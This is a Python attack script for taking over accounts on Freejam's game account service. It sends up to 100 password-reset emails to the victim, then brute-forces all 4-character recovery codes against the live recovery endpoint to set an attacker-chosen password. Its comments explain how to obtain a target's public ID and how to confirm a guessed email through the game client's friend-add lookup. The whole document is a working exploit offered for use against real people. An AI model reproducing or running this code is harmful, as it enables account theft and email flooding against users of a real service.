import asyncio
from itertools import product
import httpx
from string import ascii_uppercase, digits
from tqdm import tqdm
from loguru import logger
from asyncio import Semaphore

# To take over an account, you need their account-id/public-id AND their email address
# Not all accounts are vulnerable to this attack, accounts that are made through steam will not work!
# This is because steam accounts are made through the steam client, and not through the freejam account system.
# You need to find the public-id/account-id and the email of an account that you want to take over.
# You can find the public-id/account-id in various places, but you need to find them yourself :p
# For the email, the best way I found is guessing and verifying it through the friend add function in the game client.
# (You enter an email address, and the game client will tell you if it's linked to an account or not)\
# This program takes roughly 1minute-5hours to complete.
max_concurrent_requests = 20  # How many requests are allowed to be sent at the same time, lower this number if you have a slow internet connection
password_reset_emails = 100  # How many emails are sent to reset the password (speeds up the process, but it also sends more emails to the owner)
account_id = ""  # You need to find this id (looks mostly like this ecad4d29-e822-4848-aa9d-9468397c8fa8 but can also be a normal name)
name = "MyTestAccount"  # Name is not needed, but it's nice to have if you run multiple instances.
email = ""  # You need to find the email
password = "XDLiyLE7mdiRj!"  # You choose the new password
possible_chars = ascii_uppercase + digits  # All possible characters for the reset code

recovery_url = "https://account.freejamgames.com/api/recovery/email"
password_change_url = "https://account.freejamgames.com/api/recovery/email/finish"
recovery_body = {
    "EmailAddress": email
}
pbar = tqdm(total=len(possible_chars) ** 4)
failed = []
logger.remove()
logger.add(lambda msg: tqdm.write(msg, end=""), colorize=True)


async def send_recovery(client, semaphore):
    async with semaphore:
        await client.post(recovery_url, json=recovery_body)


async def bruteforce(client, recovery_code: str, semaphore) -> str:
    res = ""
    data = {
        "PublicId": account_id,
        "Code": recovery_code,
        "Password": password
    }

    try:
        r = await client.post(url=password_change_url, json=data)
        if r.status_code == 200:
            res = recovery_code
        else:
            pass
    except Exception as e:
        logger.error(f"Tried {recovery_code}: {e}")
        failed.append(recovery_code)
        pbar.postfix = f"Failed: {len(failed)}"

    semaphore.release()
    return res


async def main():
    logger.info(f"Starting takeover for {name}")
    semaphore = Semaphore(max_concurrent_requests)
    recover_semaphore = Semaphore(5)
    client = httpx.AsyncClient()
    await asyncio.gather(*[send_recovery(client, recover_semaphore) for _ in range(password_reset_emails)])
    logger.info(f"Sent {password_reset_emails} recovery emails")
    all_possible_codes = (a + b + c + d for a, b, c, d in product(possible_chars, repeat=4))
    success_code = ""
    running_tasks = []
    logger.info("Starting bruteforce")
    for i, possible_code in enumerate(all_possible_codes):
        await semaphore.acquire()
        pbar.desc = f"{possible_code}"
        running_tasks.append(asyncio.create_task(bruteforce(client, possible_code, semaphore)))
        pbar.update(1)
        _running_tasks = []
        for task in running_tasks:
            if task.done():
                code = task.result()
                if code:
                    logger.info(f"Found code: {code}")
                    success_code = code
                    break
            else:
                _running_tasks.append(task)
        running_tasks = _running_tasks

        if success_code:
            break
    for task in running_tasks:
        task.cancel()
    if success_code:
        logger.info("Done")
        logger.success(f"Success code is {success_code}. Password is now {password}, closing")
    else:
        logger.error("Failed")
        logger.error(f"Failed codes: {failed}")
    await asyncio.sleep(5)
    await client.aclose()


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except:
        logger.info(f"Got to {pbar.n}, Exiting")
